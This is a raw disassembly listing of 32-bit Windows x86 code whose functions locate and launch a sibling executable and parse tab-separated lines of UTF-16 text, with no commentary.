  4022c0:	50                   	push   %eax
  4022c1:	ff 15 4c 10 42 00    	call   *0x42104c
  4022c7:	89 06                	mov    %eax,(%esi)
  4022c9:	8b c6                	mov    %esi,%eax
  4022cb:	5e                   	pop    %esi
  4022cc:	5b                   	pop    %ebx
  4022cd:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4022d0:	33 cd                	xor    %ebp,%ecx
  4022d2:	e8 24 9f 00 00       	call   0x40c1fb
  4022d7:	8b e5                	mov    %ebp,%esp
  4022d9:	5d                   	pop    %ebp
  4022da:	c3                   	ret
  4022db:	6a 02                	push   $0x2
  4022dd:	ff 15 50 11 42 00    	call   *0x421150
  4022e3:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4022e6:	8b c6                	mov    %esi,%eax
  4022e8:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4022ee:	33 cd                	xor    %ebp,%ecx
  4022f0:	5e                   	pop    %esi
  4022f1:	5b                   	pop    %ebx
  4022f2:	e8 04 9f 00 00       	call   0x40c1fb
  4022f7:	8b e5                	mov    %ebp,%esp
  4022f9:	5d                   	pop    %ebp
  4022fa:	c3                   	ret
  4022fb:	cc                   	int3
  4022fc:	cc                   	int3
  4022fd:	cc                   	int3
  4022fe:	cc                   	int3
  4022ff:	cc                   	int3
  402300:	55                   	push   %ebp
  402301:	8b ec                	mov    %esp,%ebp
  402303:	83 e4 f0             	and    $0xfffffff0,%esp
  402306:	81 ec 8c 08 00 00    	sub    $0x88c,%esp
  40230c:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  402311:	33 c4                	xor    %esp,%eax
  402313:	89 84 24 88 08 00 00 	mov    %eax,0x888(%esp)
  40231a:	56                   	push   %esi
  40231b:	8b 75 08             	mov    0x8(%ebp),%esi
  40231e:	8d 44 24 68          	lea    0x68(%esp),%eax
  402322:	68 04 01 00 00       	push   $0x104
  402327:	50                   	push   %eax
  402328:	6a 00                	push   $0x0
  40232a:	88 4c 24 1b          	mov    %cl,0x1b(%esp)
  40232e:	ff 15 80 10 42 00    	call   *0x421080
  402334:	85 c0                	test   %eax,%eax
  402336:	0f 84 9d 01 00 00    	je     0x4024d9
  40233c:	3d 04 01 00 00       	cmp    $0x104,%eax
  402341:	0f 84 92 01 00 00    	je     0x4024d9
  402347:	8d 44 24 68          	lea    0x68(%esp),%eax
  40234b:	50                   	push   %eax
  40234c:	ff 15 14 12 42 00    	call   *0x421214
  402352:	51                   	push   %ecx
  402353:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  402357:	ba 04 01 00 00       	mov    $0x104,%edx
  40235c:	50                   	push   %eax
  40235d:	51                   	push   %ecx
  40235e:	8d 8c 24 7c 02 00 00 	lea    0x27c(%esp),%ecx
  402365:	e8 96 fd ff ff       	call   0x402100
  40236a:	68 38 6d 42 00       	push   $0x426d38
  40236f:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  402373:	50                   	push   %eax
  402374:	ff 15 18 12 42 00    	call   *0x421218
  40237a:	8d 44 24 68          	lea    0x68(%esp),%eax
  40237e:	50                   	push   %eax
  40237f:	ff 15 84 10 42 00    	call   *0x421084
  402385:	83 f8 ff             	cmp    $0xffffffff,%eax
  402388:	0f 84 43 01 00 00    	je     0x4024d1
  40238e:	a8 10                	test   $0x10,%al
  402390:	0f 85 3b 01 00 00    	jne    0x4024d1
  402396:	ba 04 00 00 00       	mov    $0x4,%edx
  40239b:	8d 4c 24 68          	lea    0x68(%esp),%ecx
  40239f:	e8 ac fd ff ff       	call   0x402150
  4023a4:	85 c0                	test   %eax,%eax
  4023a6:	0f 85 2d 01 00 00    	jne    0x4024d9
  4023ac:	56                   	push   %esi
  4023ad:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  4023b1:	50                   	push   %eax
  4023b2:	68 54 6d 42 00       	push   $0x426d54
  4023b7:	8d 84 24 84 04 00 00 	lea    0x484(%esp),%eax
  4023be:	68 08 02 00 00       	push   $0x208
  4023c3:	50                   	push   %eax
  4023c4:	e8 a7 fc ff ff       	call   0x402070
  4023c9:	83 c4 14             	add    $0x14,%esp
  4023cc:	80 7c 24 0f 00       	cmpb   $0x0,0xf(%esp)
  4023d1:	74 57                	je     0x40242a
  4023d3:	b9 08 02 00 00       	mov    $0x208,%ecx
  4023d8:	8d 84 24 78 04 00 00 	lea    0x478(%esp),%eax
  4023df:	90                   	nop
  4023e0:	66 83 38 00          	cmpw   $0x0,(%eax)
  4023e4:	74 08                	je     0x4023ee
  4023e6:	83 c0 02             	add    $0x2,%eax
  4023e9:	83 e9 01             	sub    $0x1,%ecx
  4023ec:	75 f2                	jne    0x4023e0
  4023ee:	85 c9                	test   %ecx,%ecx
  4023f0:	74 38                	je     0x40242a
  4023f2:	8b d1                	mov    %ecx,%edx
  4023f4:	8d 81 f8 fd ff ff    	lea    -0x208(%ecx),%eax
  4023fa:	f7 da                	neg    %edx
  4023fc:	51                   	push   %ecx
  4023fd:	1b d2                	sbb    %edx,%edx
  4023ff:	23 d0                	and    %eax,%edx
  402401:	b8 08 02 00 00       	mov    $0x208,%eax
  402406:	2b c1                	sub    %ecx,%eax
  402408:	81 c2 08 02 00 00    	add    $0x208,%edx
  40240e:	68 78 6d 42 00       	push   $0x426d78
  402413:	51                   	push   %ecx
  402414:	03 c0                	add    %eax,%eax
  402416:	f7 d9                	neg    %ecx
  402418:	1b c9                	sbb    %ecx,%ecx
  40241a:	23 c8                	and    %eax,%ecx
  40241c:	8d 84 24 84 04 00 00 	lea    0x484(%esp),%eax
  402423:	03 c8                	add    %eax,%ecx
  402425:	e8 d6 fc ff ff       	call   0x402100
  40242a:	8d 44 24 10          	lea    0x10(%esp),%eax
  40242e:	c7 44 24 20 44 00 00 	movl   $0x44,0x20(%esp)
  402435:	00 
  402436:	50                   	push   %eax
  402437:	8d 44 24 24          	lea    0x24(%esp),%eax
  40243b:	0f 57 c0             	xorps  %xmm0,%xmm0
  40243e:	50                   	push   %eax
  40243f:	8d 84 24 78 02 00 00 	lea    0x278(%esp),%eax
  402446:	0f 29 44 24 18       	movaps %xmm0,0x18(%esp)
  40244b:	50                   	push   %eax
  40244c:	6a 00                	push   $0x0
  40244e:	68 00 02 00 08       	push   $0x8000200
  402453:	6a 00                	push   $0x0
  402455:	6a 00                	push   $0x0
  402457:	6a 00                	push   $0x0
  402459:	8d 84 24 98 04 00 00 	lea    0x498(%esp),%eax
  402460:	66 0f 13 44 24 44    	movlpd %xmm0,0x44(%esp)
  402466:	50                   	push   %eax
  402467:	6a 00                	push   $0x0
  402469:	66 0f 13 44 24 54    	movlpd %xmm0,0x54(%esp)
  40246f:	66 0f 13 44 24 5c    	movlpd %xmm0,0x5c(%esp)
  402475:	66 0f 13 44 24 64    	movlpd %xmm0,0x64(%esp)
  40247b:	66 0f 13 44 24 6c    	movlpd %xmm0,0x6c(%esp)
  402481:	66 0f 13 44 24 74    	movlpd %xmm0,0x74(%esp)
  402487:	66 0f 13 44 24 7c    	movlpd %xmm0,0x7c(%esp)
  40248d:	66 0f 13 84 24 84 00 	movlpd %xmm0,0x84(%esp)
  402494:	00 00 
  402496:	ff 15 88 10 42 00    	call   *0x421088
  40249c:	85 c0                	test   %eax,%eax
  40249e:	74 39                	je     0x4024d9
  4024a0:	8b 44 24 14          	mov    0x14(%esp),%eax
  4024a4:	8b 35 8c 10 42 00    	mov    0x42108c,%esi
  4024aa:	85 c0                	test   %eax,%eax
  4024ac:	74 03                	je     0x4024b1
  4024ae:	50                   	push   %eax
  4024af:	ff d6                	call   *%esi
  4024b1:	8b 44 24 10          	mov    0x10(%esp),%eax
  4024b5:	85 c0                	test   %eax,%eax
  4024b7:	74 03                	je     0x4024bc
  4024b9:	50                   	push   %eax
  4024ba:	ff d6                	call   *%esi
  4024bc:	b0 01                	mov    $0x1,%al
  4024be:	5e                   	pop    %esi
  4024bf:	8b 8c 24 88 08 00 00 	mov    0x888(%esp),%ecx
  4024c6:	33 cc                	xor    %esp,%ecx
  4024c8:	e8 2e 9d 00 00       	call   0x40c1fb
  4024cd:	8b e5                	mov    %ebp,%esp
  4024cf:	5d                   	pop    %ebp
  4024d0:	c3                   	ret
  4024d1:	6a 02                	push   $0x2
  4024d3:	ff 15 50 11 42 00    	call   *0x421150
  4024d9:	8b 8c 24 8c 08 00 00 	mov    0x88c(%esp),%ecx
  4024e0:	32 c0                	xor    %al,%al
  4024e2:	5e                   	pop    %esi
  4024e3:	33 cc                	xor    %esp,%ecx
  4024e5:	e8 11 9d 00 00       	call   0x40c1fb
  4024ea:	8b e5                	mov    %ebp,%esp
  4024ec:	5d                   	pop    %ebp
  4024ed:	c3                   	ret
  4024ee:	cc                   	int3
  4024ef:	cc                   	int3
  4024f0:	55                   	push   %ebp
  4024f1:	8b ec                	mov    %esp,%ebp
  4024f3:	6a ff                	push   $0xffffffff
  4024f5:	68 70 04 42 00       	push   $0x420470
  4024fa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402500:	50                   	push   %eax
  402501:	83 ec 38             	sub    $0x38,%esp
  402504:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  402509:	33 c5                	xor    %ebp,%eax
  40250b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40250e:	53                   	push   %ebx
  40250f:	56                   	push   %esi
  402510:	57                   	push   %edi
  402511:	50                   	push   %eax
  402512:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402515:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40251b:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  40251e:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  402521:	8b 45 08             	mov    0x8(%ebp),%eax
  402524:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  402527:	85 c0                	test   %eax,%eax
  402529:	75 0f                	jne    0x40253a
  40252b:	89 01                	mov    %eax,(%ecx)
  40252d:	89 41 04             	mov    %eax,0x4(%ecx)
  402530:	89 41 08             	mov    %eax,0x8(%ecx)
  402533:	8b c1                	mov    %ecx,%eax
  402535:	e9 8d 00 00 00       	jmp    0x4025c7
  40253a:	d1 e8                	shr    $1,%eax
  40253c:	0f 57 c0             	xorps  %xmm0,%xmm0
  40253f:	66 0f d6 45 e0       	movq   %xmm0,-0x20(%ebp)
  402544:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  40254b:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  402552:	8d 1c 42             	lea    (%edx,%eax,2),%ebx
  402555:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  40255c:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402563:	b8 ff fe 00 00       	mov    $0xfeff,%eax
  402568:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40256f:	66 39 02             	cmp    %ax,(%edx)
  402572:	8d 7a 02             	lea    0x2(%edx),%edi
  402575:	0f 45 fa             	cmovne %edx,%edi
  402578:	8b f7                	mov    %edi,%esi
  40257a:	3b fb                	cmp    %ebx,%edi
  40257c:	74 16                	je     0x402594
  40257e:	66 90                	xchg   %ax,%ax
  402580:	0f b7 06             	movzwl (%esi),%eax
  402583:	83 f8 0d             	cmp    $0xd,%eax
  402586:	74 5b                	je     0x4025e3
  402588:	83 f8 0a             	cmp    $0xa,%eax
  40258b:	74 56                	je     0x4025e3
  40258d:	83 c6 02             	add    $0x2,%esi
  402590:	3b f3                	cmp    %ebx,%esi
  402592:	75 ec                	jne    0x402580
  402594:	8b 75 c0             	mov    -0x40(%ebp),%esi
  402597:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40259a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40259d:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  4025a4:	89 06                	mov    %eax,(%esi)
  4025a6:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4025a9:	89 46 04             	mov    %eax,0x4(%esi)
  4025ac:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4025af:	89 46 08             	mov    %eax,0x8(%esi)
  4025b2:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  4025b9:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  4025c0:	e8 8b 05 00 00       	call   0x402b50
  4025c5:	8b c6                	mov    %esi,%eax
  4025c7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4025ca:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4025d1:	59                   	pop    %ecx
  4025d2:	5f                   	pop    %edi
  4025d3:	5e                   	pop    %esi
  4025d4:	5b                   	pop    %ebx
  4025d5:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4025d8:	33 cd                	xor    %ebp,%ecx
  4025da:	e8 1c 9c 00 00       	call   0x40c1fb
  4025df:	8b e5                	mov    %ebp,%esp
  4025e1:	5d                   	pop    %ebp
  4025e2:	c3                   	ret
  4025e3:	3b f3                	cmp    %ebx,%esi
  4025e5:	74 ad                	je     0x402594
  4025e7:	3b f7                	cmp    %edi,%esi
  4025e9:	75 05                	jne    0x4025f0
  4025eb:	83 c7 02             	add    $0x2,%edi
  4025ee:	eb 88                	jmp    0x402578
  4025f0:	33 c0                	xor    %eax,%eax
  4025f2:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  4025f9:	66 89 45 c8          	mov    %ax,-0x38(%ebp)
  4025fd:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402600:	8b c6                	mov    %esi,%eax
  402602:	c7 45 dc 07 00 00 00 	movl   $0x7,-0x24(%ebp)
  402609:	2b c7                	sub    %edi,%eax
  40260b:	d1 f8                	sar    $1,%eax
  40260d:	50                   	push   %eax
  40260e:	57                   	push   %edi
  40260f:	e8 0c ed ff ff       	call   0x401320
  402614:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  402618:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40261b:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40261e:	3b ca                	cmp    %edx,%ecx
  402620:	73 17                	jae    0x402639
  402622:	8d 41 01             	lea    0x1(%ecx),%eax
  402625:	83 fa 08             	cmp    $0x8,%edx
  402628:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40262b:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40262e:	0f 43 45 c8          	cmovae -0x38(%ebp),%eax
  402632:	33 d2                	xor    %edx,%edx
  402634:	89 14 48             	mov    %edx,(%eax,%ecx,2)
  402637:	eb 12                	jmp    0x40264b
  402639:	6a 00                	push   $0x0
  40263b:	c6 45 c4 00          	movb   $0x0,-0x3c(%ebp)
  40263f:	ff 75 c4             	push   -0x3c(%ebp)
  402642:	51                   	push   %ecx
  402643:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402646:	e8 15 0a 00 00       	call   0x403060
  40264b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40264e:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402651:	51                   	push   %ecx
  402652:	39 45 e8             	cmp    %eax,-0x18(%ebp)
  402655:	74 0d                	je     0x402664
  402657:	8b c8                	mov    %eax,%ecx
  402659:	e8 c2 0b 00 00       	call   0x403220
  40265e:	83 45 e4 18          	addl   $0x18,-0x1c(%ebp)
  402662:	eb 09                	jmp    0x40266d
  402664:	50                   	push   %eax
  402665:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402668:	e8 e3 07 00 00       	call   0x402e50
  40266d:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  402671:	8b fe                	mov    %esi,%edi
  402673:	8b 55 dc             	mov    -0x24(%ebp),%edx
  402676:	83 fa 08             	cmp    $0x8,%edx
  402679:	0f 82 f9 fe ff ff    	jb     0x402578
  40267f:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  402682:	8d 14 55 02 00 00 00 	lea    0x2(,%edx,2),%edx
  402689:	8b c1                	mov    %ecx,%eax
  40268b:	81 fa 00 10 00 00    	cmp    $0x1000,%edx
  402691:	72 10                	jb     0x4026a3
  402693:	8b 49 fc             	mov    -0x4(%ecx),%ecx
  402696:	83 c2 23             	add    $0x23,%edx
  402699:	2b c1                	sub    %ecx,%eax
  40269b:	83 c0 fc             	add    $0xfffffffc,%eax
  40269e:	83 f8 1f             	cmp    $0x1f,%eax
  4026a1:	77 0f                	ja     0x4026b2
  4026a3:	52                   	push   %edx
  4026a4:	51                   	push   %ecx
  4026a5:	e8 62 9b 00 00       	call   0x40c20c
  4026aa:	83 c4 08             	add    $0x8,%esp
  4026ad:	e9 c6 fe ff ff       	jmp    0x402578
  4026b2:	e8 e2 da 00 00       	call   0x410199
  4026b7:	cc                   	int3
  4026b8:	cc                   	int3
  4026b9:	cc                   	int3
  4026ba:	cc                   	int3
  4026bb:	cc                   	int3
  4026bc:	cc                   	int3
  4026bd:	cc                   	int3
  4026be:	cc                   	int3
  4026bf:	cc                   	int3
  4026c0:	53                   	push   %ebx
  4026c1:	8b dc                	mov    %esp,%ebx
  4026c3:	83 ec 08             	sub    $0x8,%esp
  4026c6:	83 e4 f8             	and    $0xfffffff8,%esp
  4026c9:	83 c4 04             	add    $0x4,%esp
  4026cc:	55                   	push   %ebp
  4026cd:	8b 6b 04             	mov    0x4(%ebx),%ebp
  4026d0:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4026d4:	8b ec                	mov    %esp,%ebp
  4026d6:	6a ff                	push   $0xffffffff
  4026d8:	68 ce 04 42 00       	push   $0x4204ce
  4026dd:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4026e3:	50                   	push   %eax
  4026e4:	53                   	push   %ebx
  4026e5:	81 ec 88 00 00 00    	sub    $0x88,%esp
  4026eb:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  4026f0:	33 c5                	xor    %ebp,%eax
  4026f2:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4026f5:	56                   	push   %esi
  4026f6:	57                   	push   %edi
  4026f7:	50                   	push   %eax
  4026f8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4026fb:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402701:	8b f2                	mov    %edx,%esi
  402703:	8b c1                	mov    %ecx,%eax
  402705:	89 45 9c             	mov    %eax,-0x64(%ebp)
  402708:	89 45 ac             	mov    %eax,-0x54(%ebp)
  40270b:	8b 4b 08             	mov    0x8(%ebx),%ecx
  40270e:	89 45 ac             	mov    %eax,-0x54(%ebp)
  402711:	85 c9                	test   %ecx,%ecx
  402713:	75 0d                	jne    0x402722
  402715:	89 08                	mov    %ecx,(%eax)
  402717:	89 48 04             	mov    %ecx,0x4(%eax)
  40271a:	89 48 08             	mov    %ecx,0x8(%eax)
  40271d:	e9 95 00 00 00       	jmp    0x4027b7
  402722:	d1 e9                	shr    $1,%ecx
  402724:	0f 57 c0             	xorps  %xmm0,%xmm0
  402727:	66 0f d6 45 e0       	movq   %xmm0,-0x20(%ebp)
  40272c:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402733:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  40273a:	8d 14 4e             	lea    (%esi,%ecx,2),%edx
  40273d:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  402744:	89 55 a4             	mov    %edx,-0x5c(%ebp)
  402747:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  40274e:	b8 ff fe 00 00       	mov    $0xfeff,%eax
  402753:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40275a:	66 39 06             	cmp    %ax,(%esi)
  40275d:	8d 4e 02             	lea    0x2(%esi),%ecx
  402760:	0f 45 ce             	cmovne %esi,%ecx
  402763:	8b f1                	mov    %ecx,%esi
  402765:	3b ca                	cmp    %edx,%ecx
  402767:	74 1b                	je     0x402784
  402769:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  402770:	0f b7 06             	movzwl (%esi),%eax
  402773:	83 f8 0d             	cmp    $0xd,%eax
  402776:	74 5d                	je     0x4027d5
  402778:	83 f8 0a             	cmp    $0xa,%eax
  40277b:	74 58                	je     0x4027d5
  40277d:	83 c6 02             	add    $0x2,%esi
  402780:	3b f2                	cmp    %edx,%esi
  402782:	75 ec                	jne    0x402770
  402784:	8b 75 9c             	mov    -0x64(%ebp),%esi
  402787:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40278a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40278d:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  402794:	89 06                	mov    %eax,(%esi)
  402796:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402799:	89 46 04             	mov    %eax,0x4(%esi)
  40279c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40279f:	89 46 08             	mov    %eax,0x8(%esi)
  4027a2:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  4027a9:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  4027b0:	e8 1b 03 00 00       	call   0x402ad0
  4027b5:	8b c6                	mov    %esi,%eax
  4027b7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4027ba:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4027c1:	59                   	pop    %ecx
  4027c2:	5f                   	pop    %edi
  4027c3:	5e                   	pop    %esi
  4027c4:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4027c7:	33 cd                	xor    %ebp,%ecx
  4027c9:	e8 2d 9a 00 00       	call   0x40c1fb
  4027ce:	8b e5                	mov    %ebp,%esp
  4027d0:	5d                   	pop    %ebp
  4027d1:	8b e3                	mov    %ebx,%esp
  4027d3:	5b                   	pop    %ebx
  4027d4:	c3                   	ret
  4027d5:	3b f2                	cmp    %edx,%esi
  4027d7:	74 ab                	je     0x402784
  4027d9:	3b f1                	cmp    %ecx,%esi
  4027db:	75 05                	jne    0x4027e2
  4027dd:	83 c1 02             	add    $0x2,%ecx
  4027e0:	eb 81                	jmp    0x402763
  4027e2:	8b f9                	mov    %ecx,%edi
  4027e4:	66 83 3f 09          	cmpw   $0x9,(%edi)
  4027e8:	74 0c                	je     0x4027f6
  4027ea:	83 c7 02             	add    $0x2,%edi
  4027ed:	3b fe                	cmp    %esi,%edi
  4027ef:	75 f3                	jne    0x4027e4
  4027f1:	e9 6d ff ff ff       	jmp    0x402763
  4027f6:	3b fe                	cmp    %esi,%edi
  4027f8:	0f 84 65 ff ff ff    	je     0x402763
  4027fe:	b8 07 00 00 00       	mov    $0x7,%eax
  402803:	33 d2                	xor    %edx,%edx
  402805:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402808:	33 c0                	xor    %eax,%eax
  40280a:	66 89 45 c8          	mov    %ax,-0x38(%ebp)
  40280e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402811:	89 55 d8             	mov    %edx,-0x28(%ebp)
  402814:	3b cf                	cmp    %edi,%ecx
  402816:	74 16                	je     0x40282e
  402818:	8b c7                	mov    %edi,%eax
  40281a:	2b c1                	sub    %ecx,%eax
  40281c:	d1 f8                	sar    $1,%eax
  40281e:	50                   	push   %eax
  40281f:	51                   	push   %ecx
  402820:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402823:	e8 f8 ea ff ff       	call   0x401320
  402828:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40282b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40282e:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  402832:	3b d0                	cmp    %eax,%edx
  402834:	73 18                	jae    0x40284e
  402836:	83 7d dc 08          	cmpl   $0x8,-0x24(%ebp)
  40283a:	8d 42 01             	lea    0x1(%edx),%eax
  40283d:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402840:	8d 45 c8             	lea    -0x38(%ebp),%eax
  402843:	0f 43 45 c8          	cmovae -0x38(%ebp),%eax
  402847:	33 c9                	xor    %ecx,%ecx
  402849:	89 0c 50             	mov    %ecx,(%eax,%edx,2)
  40284c:	eb 12                	jmp    0x402860
  40284e:	6a 00                	push   $0x0
  402850:	c6 45 a0 00          	movb   $0x0,-0x60(%ebp)
  402854:	ff 75 a0             	push   -0x60(%ebp)
  402857:	51                   	push   %ecx
  402858:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40285b:	e8 00 08 00 00       	call   0x403060
  402860:	83 c7 02             	add    $0x2,%edi
  402863:	33 c9                	xor    %ecx,%ecx
  402865:	33 c0                	xor    %eax,%eax
  402867:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  40286a:	66 89 45 b0          	mov    %ax,-0x50(%ebp)
  40286e:	ba 07 00 00 00       	mov    $0x7,%edx
  402873:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  402876:	3b fe                	cmp    %esi,%edi
  402878:	74 16                	je     0x402890
  40287a:	8b c6                	mov    %esi,%eax
  40287c:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40287f:	2b c7                	sub    %edi,%eax
  402881:	d1 f8                	sar    $1,%eax
  402883:	50                   	push   %eax
  402884:	57                   	push   %edi
  402885:	e8 96 ea ff ff       	call   0x401320
  40288a:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  40288d:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  402890:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  402894:	3b ca                	cmp    %edx,%ecx
  402896:	73 17                	jae    0x4028af
  402898:	8d 41 01             	lea    0x1(%ecx),%eax
  40289b:	83 fa 08             	cmp    $0x8,%edx
  40289e:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4028a1:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4028a4:	0f 43 45 b0          	cmovae -0x50(%ebp),%eax
  4028a8:	33 d2                	xor    %edx,%edx
  4028aa:	89 14 48             	mov    %edx,(%eax,%ecx,2)
  4028ad:	eb 12                	jmp    0x4028c1
  4028af:	6a 00                	push   $0x0
  4028b1:	c6 45 ac 00          	movb   $0x0,-0x54(%ebp)
  4028b5:	ff 75 ac             	push   -0x54(%ebp)
  4028b8:	51                   	push   %ecx
  4028b9:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4028bc:	e8 9f 07 00 00       	call   0x403060
  4028c1:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4028c4:	50                   	push   %eax
  4028c5:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  4028cb:	e8 50 09 00 00       	call   0x403220
  4028d0:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4028d3:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  4028d7:	50                   	push   %eax
  4028d8:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
  4028db:	e8 40 09 00 00       	call   0x403220
  4028e0:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  4028e4:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4028e7:	39 45 e8             	cmp    %eax,-0x18(%ebp)
  4028ea:	74 60                	je     0x40294c
  4028ec:	0f 10 85 6c ff ff ff 	movups -0x94(%ebp),%xmm0
  4028f3:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%eax)
  4028fa:	33 c9                	xor    %ecx,%ecx
  4028fc:	66 89 8d 6c ff ff ff 	mov    %cx,-0x94(%ebp)
  402903:	0f 11 00             	movups %xmm0,(%eax)
  402906:	f3 0f 7e 85 7c ff ff 	movq   -0x84(%ebp),%xmm0
  40290d:	ff 
  40290e:	66 0f d6 40 10       	movq   %xmm0,0x10(%eax)
  402913:	0f 10 45 84          	movups -0x7c(%ebp),%xmm0
  402917:	c7 85 7c ff ff ff 00 	movl   $0x0,-0x84(%ebp)
  40291e:	00 00 00 
  402921:	c7 45 80 07 00 00 00 	movl   $0x7,-0x80(%ebp)
  402928:	0f 11 40 18          	movups %xmm0,0x18(%eax)
  40292c:	f3 0f 7e 45 94       	movq   -0x6c(%ebp),%xmm0
  402931:	66 0f d6 40 28       	movq   %xmm0,0x28(%eax)
  402936:	33 c0                	xor    %eax,%eax
  402938:	83 45 e4 30          	addl   $0x30,-0x1c(%ebp)
  40293c:	89 4d 94             	mov    %ecx,-0x6c(%ebp)
  40293f:	c7 45 98 07 00 00 00 	movl   $0x7,-0x68(%ebp)
  402946:	66 89 45 84          	mov    %ax,-0x7c(%ebp)
  40294a:	eb 10                	jmp    0x40295c
  40294c:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  402952:	51                   	push   %ecx
  402953:	50                   	push   %eax
  402954:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402957:	e8 d4 02 00 00       	call   0x402c30
  40295c:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  402962:	e8 99 00 00 00       	call   0x402a00
  402967:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  40296b:	8b ce                	mov    %esi,%ecx
  40296d:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  402970:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  402973:	83 fa 08             	cmp    $0x8,%edx
  402976:	72 31                	jb     0x4029a9
  402978:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  40297b:	8d 14 55 02 00 00 00 	lea    0x2(,%edx,2),%edx
  402982:	8b c1                	mov    %ecx,%eax
  402984:	81 fa 00 10 00 00    	cmp    $0x1000,%edx
  40298a:	72 10                	jb     0x40299c
  40298c:	8b 49 fc             	mov    -0x4(%ecx),%ecx
  40298f:	83 c2 23             	add    $0x23,%edx
  402992:	2b c1                	sub    %ecx,%eax
  402994:	83 c0 fc             	add    $0xfffffffc,%eax
  402997:	83 f8 1f             	cmp    $0x1f,%eax
  40299a:	77 59                	ja     0x4029f5
